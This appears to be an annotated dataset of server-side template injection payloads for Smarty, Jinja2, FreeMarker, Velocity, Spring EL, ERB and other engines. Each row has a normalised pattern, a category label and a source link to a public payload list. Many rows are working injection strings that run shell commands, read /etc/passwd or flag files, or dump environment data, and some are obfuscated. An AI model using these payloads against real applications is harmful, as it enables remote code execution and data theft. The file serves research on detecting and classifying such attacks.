{config_load file='/etc/passwd'},{config_loadfile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{config_load file='flag.txt'},{config_loadfile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{insert name='system' script='id'},{insertname='S'script='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{insert name='exec' script='id'},{insertname='S'script='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{insert name='passthru' script='id'},{insertname='S'script='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='sy'.'stem';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='ex'.'ec';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='pass'.'thru';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='sh'.'ell_exec';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a=base64_decode('c3lzdGVt');$a('id');{/php},{php}$a=baseN_decode('S');$a('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}$a=""\x73\x79\x73\x74\x65\x6d"";$a('id');{/php}","{php}$a=""S"";$a('S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@system('id');{/php},{php}@system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@exec('id');{/php},{php}@exec('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@passthru('id');{/php},{php}@passthru('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@shell_exec('id');{/php},{php}@shell_exec('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@phpinfo();{/php},{php}@phpinfo();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}ini_set('display_errors','1');{/php}","{php}ini_set('S','S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}error_reporting(E_ALL);{/php},{php}error_reporting(e_all);{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}phpversion();{/php},{php}phpversion();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}php_uname();{/php},{php}php_uname();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmyuid();{/php},{php}getmyuid();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmygid();{/php},{php}getmygid();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmypid();{/php},{php}getmypid();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmyinode();{/php},{php}getmyinode();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getlastmod();{/php},{php}getlastmod();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_current_user();{/php},{php}get_current_user();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getcwd();{/php},{php}getcwd();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}disk_free_space('/');{/php},{php}disk_free_space('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}disk_total_space('/');{/php},{php}disk_total_space('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_cfg_var('upload_max_filesize');{/php},{php}get_cfg_var('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_cfg_var('post_max_size');{/php},{php}get_cfg_var('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}ini_get('disable_functions');{/php},{php}ini_get('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}ini_get('open_basedir');{/php},{php}ini_get('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}ini_get('safe_mode');{/php},{php}ini_get('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_loaded_extensions();{/php},{php}get_loaded_extensions();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_defined_functions();{/php},{php}get_defined_functions();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_defined_constants();{/php},{php}get_defined_constants();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r($_SERVER);{/php},{php}print_r($_server);{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r($_ENV);{/php},{php}print_r($_env);{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r(get_defined_vars());{/php},{php}print_r(get_defined_vars());{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
${7*7},${N*N},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x=7*7),#set($x=N*N),multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*'7'}}${7*'7'},{{N*'S'}}${N*'S'},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*'7'}}${7*'7'}<%= 7*'7' %>{7*'7'},{{N*'S'}}${N*'S'}<%=N*'S'%>{N*'S'},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{}}${}<%= %>{7*7},{{}}${}<%=%>{N*N},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${7*7}<%= 7*7 %>{7*7},{{N*N}}${N*N}<%=N*N%>{N*N},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}${System},{{config}}${system},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{self}}${_self},{{self}}${_self},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request}}${{request}},{{request}}${{request}},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{_self}}{{app}}${_self},{{_self}}{{app}}${_self},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}{{app}}{{_self}}${{_self}},{{config}}{{app}}{{_self}}${{_self}},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N]('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""cat /etc/passwd"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}},{{lipsum.__globals__['S'].popen('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{['id']|map('system')}},{{['S']|map('S')}},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())},${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""whoami"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('whoami')),#set($x='S')#set($rt=$x.class.forname('S'))#set($ex=$rt.getruntime().exec('S')),multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\Z').next()},${newjava.util.scanner(t(java.lang.runtime).getruntime().exec('S').getinputstream()).usedelimiter('S').next()},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{<%=1%>}},${{<%=N%>}},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{<%=system('id')%>}},${{<%=system('S')%>}},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${{7*7}},{{N*N}}${{N*N}},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${7*7},{{N*N}}${N*N},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*'7'}}${{7*'7'}},{{N*'S'}}${{N*'S'}},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{'a'.toUpperCase()}}${{config}},{{'S'.touppercase()}}${{config}},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request}}${_self},{{request}}${_self},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{get_flashed_messages.__globals__['os'].popen('ls').read()}},{{get_flashed_messages.__globals__['S'].popen('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('ls -la')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""ls -la"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"#set($runtime=$class.inspect(""java.lang.Runtime"").type)#set($process=$runtime.getRuntime().exec(""ls""))","#set($runtime=$class.inspect(""S"").type)#set($process=$runtime.getruntime().exec(""S""))",multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config.__class__.__init__.__globals__['os'].popen('uname -a').read()}},{{config.__class__.__init__.__globals__['S'].popen('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.System).getProperty('os.name')},${t(java.lang.system).getproperty('S')},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}echo php_uname();{/php},{php}echophp_uname();{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""uname -a"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{url_for.__globals__['__builtins__']['__import__']('os').popen('env').read()}},{{url_for.__globals__['S']['S']('S').popen('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read()}},{{self._templatereference__context.cycler.__init__.__globals__.os.popen('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.System).getProperty('user.dir')},${t(java.lang.system).getproperty('S')},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}echo getcwd();{/php},{php}echogetcwd();{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""pwd"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('cat flag.txt')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= File.read('flag.txt') %>,<%=file.read('S')%>,multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""cat flag.txt"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('ps aux').read()}},{{request.__class__._load_form_data.__globals__.__builtins__.__import__('S').popen('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('ps aux')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{{lipsum|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""ifconfig"")|attr(""read"")()}}","{{lipsum|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('ifconfig')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('netstat -an',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'['S']['S'][N]['S']()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('netstat -an')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= `netstat -an` %>,<%=`netstat-an`%>,multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}{{7*'7'}}${{7*7}}${7*7}#{7*7},{{N*N}}{{N*'S'}}${{N*N}}${N*N}#{N*N},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}{{self}}{{request}}{{app}}{{_self}},{{config}}{{self}}{{request}}{{app}}{{_self}},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__}}${T(java.lang.System).getenv()}<%= ENV %>,{{lipsum.__globals__}}${t(java.lang.system).getenv()}<%=env%>,multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",""id"").start()}","${""S""?new()(""S"",""S"").start()}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"#set($pb=$class.inspect(""java.lang.ProcessBuilder"").type)#set($arr=[""id""])#set($process=$pb.newInstance($arr).start())","#set($pb=$class.inspect(""S"").type)#set($arr=[""S""])#set($process=$pb.newinstance($arr).start())",multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__base__.__subclasses__()}},{{'S'.__class__.__base__.__subclasses__()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Class).forName('java.lang.Runtime')},${t(java.lang.class).forname('S')},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}get_declared_classes();{/php},{php}get_declared_classes();{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.application.__globals__.__builtins__}},{{request.application.__globals__.__builtins__}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime()},${t(java.lang.runtime).getruntime()},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__['__builtins__']}},{{lipsum.__globals__['S']}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${@systemProperties},${@systemproperties},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= defined?(Rails) %>,<%=defined?(rails)%>,multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}defined('SMARTY_VERSION');{/php},{php}defined('S');{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__mro__[1].__subclasses__()[40]}},{{'S'.__class__.__mro__[N].__subclasses__()[N]}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${new java.io.File('/etc/passwd')},${newjava.io.file('S')},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= File.new('/etc/passwd') %>,<%=file.new('S')%>,multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}new SplFileObject('/etc/passwd');{/php},{php}newsplfileobject('S');{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config.__class__}},{{config.__class__}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.String).getClass()},${t(java.lang.string).getclass()},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}get_class($this);{/php},{php}get_class($this);{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{{request.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}","{{request.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()}}",multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{7*7}}[{7*7}],${{N*N}}[{N*N}],multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{<%[7*7]%>}},${{<%[N*N]%>}},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${7*7}{{7*7}}<%= 7*7 %>{7*7}#set($x=7*7),${N*N}{{N*N}}<%=N*N%>{N*N}#set($x=N*N),multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}${_self}<%= self %>{$smarty},{{config}}${_self}<%=self%>{$smarty},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${7*7}#set($x=49),{{N*N}}${N*N}#set($x=N),multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
